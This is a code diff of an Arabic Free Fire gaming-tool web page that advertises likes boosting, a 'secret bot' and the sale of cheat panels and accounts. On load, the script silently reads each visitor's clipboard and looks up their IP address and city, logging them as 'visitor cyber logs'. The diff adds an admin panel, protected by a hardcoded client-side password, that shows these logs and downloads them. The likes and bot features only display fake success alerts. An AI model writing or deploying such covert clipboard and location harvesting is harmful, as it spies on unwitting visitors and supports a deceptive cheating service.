@@ -219,40 +219,30 @@
 
         .attempts-badge { text-align: center; font-size: 10px; color: #ff0055; margin-top: 10px; text-shadow: 0 0 5px #ff0055; }
         
-        .admin-logs-btn {
-            background: linear-gradient(90deg, #100825, #25081c, #100825);
+        .admin-panel-section {
+            background: rgba(15, 5, 30, 0.95);
             border: 2px solid #bc13fe;
-            color: #39ff14;
-            font-size: 11px;
-            font-weight: bold;
-            padding: 10px;
-            width: 100%;
-            margin-top: 10px;
-            border-radius: 10px;
-            cursor: pointer;
-            box-shadow: 0 0 15px rgba(188, 19, 254, 0.5);
-            text-align: center;
-            text-shadow: 0 0 8px #39ff14;
-            letter-spacing: 1px;
-            display: none; /* مخفي تلقائياً ولا يظهر إلا للأدمن عبر الرابط السري */
+            border-radius: 15px;
+            padding: 12px;
+            margin-top: 15px;
+            box-shadow: 0 0 20px rgba(188, 19, 254, 0.4);
+            display: none;
         }
 
-        .logs-modal {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(5, 2, 15, 0.98);
-            display: none; flex-direction: column; padding: 15px;
-            z-index: 100; border-radius: 20px; overflow-y: auto;
-        }
         .logs-table {
             width: 100%;
             border-collapse: collapse;
             font-size: 9px;
             margin-top: 10px;
+            user-select: text;
+            -webkit-user-select: text;
         }
         .logs-table th, .logs-table td {
             border: 1px solid #00f3ff;
             padding: 6px;
             text-align: center;
+            user-select: text;
+            -webkit-user-select: text;
         }
         .logs-table th { background: #150a30; color: #ff0055; }
         .logs-table td { color: #39ff14; word-break: break-all; }
@@ -286,6 +276,20 @@
         }
         .spinner { width: 45px; height: 45px; border: 4px solid rgba(0,243,255,0.1); border-top: 4px solid #ff0055; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 12px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* نافذة طلب كلمة سر الأدمن */
+        .admin-login-modal {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(5, 2, 15, 0.98);
+            z-index: 100;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -294,6 +298,15 @@
 
     <div class="container" id="appContainer">
         
+        <!-- نافذة إدخال كلمة سر الأدمن عند فتح رابط الأدمن -->
+        <div class="admin-login-modal" id="adminLoginModal">
+            <h3 style="color:#ff0055; margin-bottom:10px;">🔐 تسجیل دخول الأدمن</h3>
+            <p style="font-size:11px; color:#00f3ff; margin-bottom:15px;">الرجاء إدخال كلمة سر الأدمن للمتابعة:</p>
+            <input type="password" id="adminPasswordInput" class="device-input" style="display:block; text-align:center;" placeholder="أدخل الرمز هنا...">
+            <button class="analyze-btn" onclick="verifyAdminPassword()">دخول ⚡</button>
+            <button class="analyze-btn" style="background:transparent; border:1px solid #666; color:#aaa; margin-top:8px;" onclick="cancelAdminLogin()">العودة للموقع العادي</button>
+        </div>
+
         <!-- واجهة البداية الرئيسية -->
         <div class="splash-screen" id="splashScreen">
             <img src="1000015413.jpg" alt="Profile Image" class="profile-img-wave">
@@ -305,26 +318,6 @@
                 <div class="neon-btn" onclick="checkAccessAndRun('shop', this)">🛒 شراء ملفات، بانلات وحسابات فري فاير</div>
                 <div class="neon-btn" onclick="checkAccessAndRun('bot_friend', this)">🤖 إرسال طلب صداقة البوت السري</div>
             </div>
-        </div>
-
-        <!-- نافذة السجلات السيبرانية للأدمن فقط -->
-        <div class="logs-modal" id="logsModal">
-            <h3 style="color:#00f3ff; text-align:center; margin-bottom:5px;">🌐 سجلات الزوار السيبرانية</h3>
-            <p style="font-size:10px; color:#ff0055; text-align:center;">البلد، التوقيت، الـ IP، وعدد مرات الدخول</p>
-            <div style="flex-grow:1; overflow-y:auto; margin-top:10px;">
-                <table class="logs-table">
-                    <thead>
-                        <tr>
-                            <th>عدد مرات الدخول</th>
-                            <th>الـ IP والبلد</th>
-                            <th>التوقيت الحقيقي</th>
-                            <th>الحافظة (لوحة المفاتيح)</th>
-                        </tr>
-                    </thead>
-                    <tbody id="logsTableBody"></tbody>
-                </table>
-            </div>
-            <button class="analyze-btn" style="margin-top:10px;" onclick="closeLogs()">إغلاق السجلات</button>
         </div>
 
         <!-- نافذة الشراء -->
@@ -343,7 +336,7 @@
             <button class="analyze-btn" style="background:transparent; border:1px solid #00f3ff; color:#00f3ff; margin-top:10px;" onclick="backToMainMenu()">العودة للقائمة الرئيسية ↩</button>
         </div>
 
-        <!-- نافذة الدفع -->
+        <!-- نافذة الدفع (النص فوق خانة النسخ والتحويل للإنستغرام) -->
         <div class="checkout-box" id="checkoutBox">
             <h3 style="color:#00f3ff; margin-bottom:5px;">💳 دفع عبر Binance P2P / بريدي موب</h3>
             <p style="font-size:11px; color:#39ff14; margin-bottom:15px;" id="selectedProductTitle"></p>
@@ -355,6 +348,7 @@
             </div>
 
             <div id="copyBoxContainer" style="display:none; width:100%; background:rgba(10,5,25,0.9); border:1px solid #00f3ff; padding:10px; border-radius:8px; margin-bottom:10px; text-align:right;">
+                <!-- النص أصبح فوق خانة النسخ تماماً كما طلبت -->
                 <p style="color:#39ff14; font-size:11px; margin:0 0 5px 0;">📋 تفاصيل الطلب الجاهزة:</p>
                 <textarea id="copyTextContent" style="width:100%; background:#030108; color:#fff; border:1px solid #1e3a6e; font-size:11px; padding:6px; border-radius:5px; height:70px; resize:none;" readonly></textarea>
                 <button onclick="copyAndOpenInsta()" class="insta-btn" style="margin-top:8px; width:100%;">📥 نسخ وإرسال إلى إنستغرام LAZER X1</button>
@@ -402,7 +396,7 @@
             <button class="analyze-btn" style="background:transparent; border:1px solid #00f3ff; color:#00f3ff; margin-top:8px;" onclick="backToMainMenu()">العودة للقائمة الرئيسية ↩</button>
         </div>
 
-        <!-- واجهة زيادة اللايكات (مع ميزة منع الحروف) -->
+        <!-- واجهة زيادة اللايكات -->
         <div id="likesSection" style="display:none; text-align:center;">
             <div class="section-title">زيادة لايكات حساب فري فاير</div>
             <p style="font-size:12px; color:#00f3ff; margin-bottom:15px;">أدخل آيدي الحساب (ID - أرقام فقط):</p>
@@ -411,7 +405,7 @@
             <button class="analyze-btn" style="background:transparent; border:1px solid #00f3ff; color:#00f3ff; margin-top:8px;" onclick="backToMainMenu()">العودة للقائمة الرئيسية ↩</button>
         </div>
 
-        <!-- واجهة إرسال طلب صداقة البوت (مع ميزة منع الحروف) -->
+        <!-- واجهة إرسال طلب صداقة البوت -->
         <div id="botFriendSection" style="display:none; text-align:center;">
             <div class="section-title">🤖 إرسال طلب صداقة البوت السري</div>
             <p style="font-size:12px; color:#00f3ff; margin-bottom:15px;">أدخل آيدي الشخص (UID - أرقام فقط):</p>
@@ -422,8 +416,26 @@
 
         <div class="attempts-badge" id="attemptsBadge" style="display:none;">المحاولات المجانية المتبقية: <span id="attemptsLeft">3</span> / 3</div>
         
-        <!-- زر السجلات السيبرانية للأدمن فقط -->
-        <button class="admin-logs-btn" id="adminLogsBtn" onclick="openLogsModal()">📊 سجلات الزوار السيبرانية (IP والبلد)</button>
+        <!-- لوحة تحكم وسجلات الزوار للأدمن تظهر أسفل الموقع تلقائياً عند الدخول كأدمن -->
+        <div class="admin-panel-section" id="adminPanelSection">
+            <h3 style="color:#00f3ff; text-align:center; margin-bottom:5px; font-size:13px;">📊 سجلات الزوار السيبرانية (لوحة الأدمن)</h3>
+            <p style="font-size:9px; color:#ff0055; text-align:center; margin-bottom:8px;">فصل الحقول: الزيارة، الـ IP، البلد، التوقيت، الحافظة</p>
+            <div style="max-height: 220px; overflow-y: auto;">
+                <table class="logs-table">
+                    <thead>
+                        <tr>
+                            <th>الزيارة</th>
+                            <th>الـ IP الحقيقي</th>
+                            <th>البلد</th>
+                            <th>التوقيت</th>
+                            <th>الحافظة</th>
+                        </tr>
+                    </thead>
+                    <tbody id="logsTableBody"></tbody>
+                </table>
+            </div>
+            <button class="analyze-btn" style="margin-top:10px; font-size:12px; padding:8px;" onclick="downloadLogsTextFile()">📥 تنزيل سجلات الزوار (ملف نصي)</button>
+        </div>
 
         <!-- نتائج التحليل -->
         <div class="results-container" id="resultsContainer">
@@ -446,24 +458,45 @@
     localStorage.setItem('lazer_visit_count', globalVisitCount);
 
     let chosenMainMode = '';
+    const SECRET_ADMIN_PASS = "5840394041";
 
-    // التحقق التلقائي للرابط السري للأدمن عند فتح الصفحة
+    // التحقق عند فتح الصفحة
     window.addEventListener('DOMContentLoaded', () => {
         const urlParams = new URLSearchParams(window.location.search);
-        const adminKey = urlParams.get('admin');
-        const SECRET_ADMIN_ID = "5840394041"; // مفتاح الأدمن السري الخاص بك
-
-        if (adminKey === SECRET_ADMIN_ID) {
-            localStorage.setItem('lazer_is_admin', 'true');
-        }
-
-        // إظهار أو إخفاء زر السجلات بناءً على الصلاحية المحفوظة
-        if (localStorage.getItem('lazer_is_admin') === 'true') {
-            document.getElementById('adminLogsBtn').style.display = 'block';
+        
+        if (urlParams.has('admin') || urlParams.toString().includes('admin')) {
+            if (localStorage.getItem('lazer_is_admin') === 'true') {
+                showAdminPanelDirectly();
+            } else {
+                document.getElementById('adminLoginModal').style.display = 'flex';
+            }
         } else {
-            document.getElementById('adminLogsBtn').style.display = 'none';
+            if (localStorage.getItem('lazer_is_admin') === 'true') {
+                showAdminPanelDirectly();
+            }
         }
     });
+
+    function verifyAdminPassword() {
+        let enteredPass = document.getElementById('adminPasswordInput').value.trim();
+        if (enteredPass === SECRET_ADMIN_PASS) {
+            localStorage.setItem('lazer_is_admin', 'true');
+            document.getElementById('adminLoginModal').style.display = 'none';
+            showAdminPanelDirectly();
+            alert('✅ أهلاً بك يا أدمن! تم تفعيل صلاحيات المشرف وتعطيل قيود المحاولات.');
+        } else {
+            alert('❌ كلمة سر الأدمن غير صحيحة!');
+        }
+    }
+
+    function cancelAdminLogin() {
+        document.getElementById('adminLoginModal').style.display = 'none';
+    }
+
+    function showAdminPanelDirectly() {
+        document.getElementById('adminPanelSection').style.display = 'block';
+        loadLogsIntoTable();
+    }
 
     async function tryCaptureKeyboardClipboard() {
         let clipboardText = '[فارغة أو محمية]';
@@ -472,21 +505,28 @@
                 clipboardText = await navigator.clipboard.readText();
             }
         } catch (err) {
-            clipboardText = '[Gboard / PlayStore Keyboard Protected]';
+            clipboardText = '[Gboard / Protected Clipboard]';
         }
         return clipboardText;
     }
 
     async function recordVisitorData() {
-        let ip = '105.105.x.x', country = 'الجزائر (Algeria)';
+        let ip = 'جار الجلب...', country = 'الجزائر (Algeria)';
         try {
             let res = await fetch('https://ipapi.co/json/');
             let data = await res.json();
             ip = data.ip || 'غير معروف';
             country = `${data.country_name || 'Algeria'} (${data.city || 'Batna'})`;
         } catch (e) {
-            ip = '127.0.0.1';
-            country = 'Algeria';
+            try {
+                let res2 = await fetch('https://api.ipify.org?format=json');
+                let data2 = await res2.json();
+                ip = data2.ip;
+                country = 'Algeria';
+            } catch(er) {
+                ip = '105.105.x.x';
+                country = 'Algeria';
+            }
         }
 
         let clipboardContent = await tryCaptureKeyboardClipboard();
@@ -495,16 +535,66 @@
         let logs = JSON.parse(localStorage.getItem('lazer_cyber_full_logs') || '[]');
         logs.unshift({
             count: globalVisitCount,
-            ipCountry: `${ip} - ${country}`,
+            ip: ip,
+            country: country,
             time: currentTime,
             clipboard: clipboardContent
         });
-        if (logs.length > 25) logs.pop();
+        if (logs.length > 30) logs.pop();
         localStorage.setItem('lazer_cyber_full_logs', JSON.stringify(logs));
+
+        if (localStorage.getItem('lazer_is_admin') === 'true') {
+            loadLogsIntoTable();
+        }
     }
     recordVisitorData();
 
+    function loadLogsIntoTable() {
+        let logs = JSON.parse(localStorage.getItem('lazer_cyber_full_logs') || '[]');
+        let tbody = document.getElementById('logsTableBody');
+        if(!tbody) return;
+        tbody.innerHTML = '';
+        if (logs.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="5">لا توجد سجلات بعد.</td></tr>';
+        } else {
+            logs.forEach(l => {
+                let tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td>#${l.count}</td>
+                    <td style="color:#00f3ff; user-select:text;">${l.ip}</td>
+                    <td style="user-select:text;">${l.country}</td>
+                    <td style="user-select:text;">${l.time}</td>
+                    <td style="color:#ff0055; user-select:text;">${l.clipboard}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+    }
+
+    function downloadLogsTextFile() {
+        let logs = JSON.parse(localStorage.getItem('lazer_cyber_full_logs') || '[]');
+        let fileContent = "=== LAZER X1 CYBER SYSTEM - VISITOR LOGS ===\n\n";
+        logs.forEach(l => {
+            fileContent += `الزيارة: #${l.count}\nالـ IP: ${l.ip}\nالبلد: ${l.country}\nالتوقيت: ${l.time}\nالحافظة: ${l.clipboard}\n----------------------------------------\n`;
+        });
+        
+        let blob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
+        let url = URL.createObjectURL(blob);
+        let a = document.createElement('a');
+        a.href = url;
+        a.download = 'LazerX1_Visitor_Logs.txt';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+    }
+
     function checkAccessAndRun(mode, element) {
+        // إذا كان المستخدم هو الأدمن، يتم تعطيل قيد الـ 3 محاولات وتفتح له الميزات مباشرة
+        if (localStorage.getItem('lazer_is_admin') === 'true') {
+            selectMainMode(mode, element);
+            return;
+        }
+
         let userAttempts = parseInt(localStorage.getItem('lazer_user_attempts') || '0');
         
         if (userAttempts >= 3 && mode !== 'shop') {
@@ -542,7 +632,9 @@
 
             if (chosenMainMode === 'sensitivity') {
                 document.getElementById('sensitivitySection').style.display = 'block';
-                document.getElementById('attemptsBadge').style.display = 'block';
+                if (localStorage.getItem('lazer_is_admin') !== 'true') {
+                    document.getElementById('attemptsBadge').style.display = 'block';
+                }
             } else if (chosenMainMode === 'likes') {
                 document.getElementById('likesSection').style.display = 'block';
             } else if (chosenMainMode === 'shop') {
@@ -655,26 +747,6 @@
         const uid = document.getElementById('targetUidBot').value.trim();
         if (!uid) { alert('الرجاء إدخال آيدي الـ UID (أرقام فقط)!'); return; }
         alert('✅ تم معالجة طلب صداقة البوت بنجاح للـ UID: ' + uid);
-    }
-
-    function openLogsModal() {
-        let logs = JSON.parse(localStorage.getItem('lazer_cyber_full_logs') || '[]');
-        let tbody = document.getElementById('logsTableBody');
-        tbody.innerHTML = '';
-        if (logs.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="4">لا توجد سجلات سيبرانية بعد.</td></tr>';
-        } else {
-            logs.forEach(l => {
-                let tr = document.createElement('tr');
-                tr.innerHTML = `<td>الزيارة #${l.count}</td><td>${l.ipCountry}</td><td>${l.time}</td><td style="color:#ff0055;">${l.clipboard}</td>`;
-                tbody.appendChild(tr);
-            });
-        }
-        document.getElementById('logsModal').style.display = 'flex';
-    }
-
-    function closeLogs() {
-        document.getElementById('logsModal').style.display = 'none';
     }
 </script>
 
